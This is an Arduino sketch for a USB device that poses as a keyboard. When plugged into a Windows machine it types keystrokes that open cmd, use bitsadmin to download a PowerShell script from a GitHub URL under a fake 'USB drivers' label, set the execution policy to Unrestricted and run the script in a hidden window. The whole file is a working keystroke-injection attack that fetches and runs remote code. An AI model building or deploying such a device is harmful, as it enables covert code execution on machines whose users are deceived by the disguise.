#include <Keyboard.h>

void setup() {
  
  Keyboard.begin(); //Start keyboard communication
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.println("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  Keyboard.println(" cd c:/ && mkdir SOFT_FIRMA & cd SOFT_FIRMA && bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/psv1.ps1\" \"%cd%/poc.ps1\" && echo Instalando Drivers: && powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -file \"%cd%/poc.ps1\" ");
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

}

void loop() {
}
